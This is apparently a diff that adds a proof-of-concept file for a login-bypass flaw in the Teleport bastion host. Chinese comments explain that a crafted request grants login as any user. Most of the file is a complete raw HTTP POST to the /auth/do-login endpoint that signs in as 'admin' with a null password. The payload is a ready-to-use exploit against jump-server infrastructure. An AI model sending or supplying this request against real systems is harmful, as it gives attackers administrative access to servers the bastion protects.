@@ -1,0 +1,14 @@
+# Teleport堡垒机_do-login_任意用户登录漏洞
+# Teleport 是一款简单易用的开源堡垒机系统,具有小巧、易用的特点,支持RDP/SSH/SFTP/Telnet协议的远程连接和审计管理。
+# 
+# Teleport堡垒机存在前台任意用户登录漏洞。攻击者经过特别构造的登录请求，可以以任意账号登录进入Teleport堡垒机系统。
+POST /auth/do-login?acid=80000904&bid=hd_tag_m8mv25ya HTTP/1.1
+Host: www.swaf.com
+Cookie: username=admin; _sid=tp_1692086966_47dcafe97d17a052
+RM-PRO-BusinessID: hd_tag_m8mv25ya
+RM-PRO-Token: a7e0fcc6c9d167c56f2ed45207791685
+RM-PRO-Time: 1742808513609
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+args={"type":2,"username":"admin","password":null,"captcha":"dwwa","oath":"","remember":false}
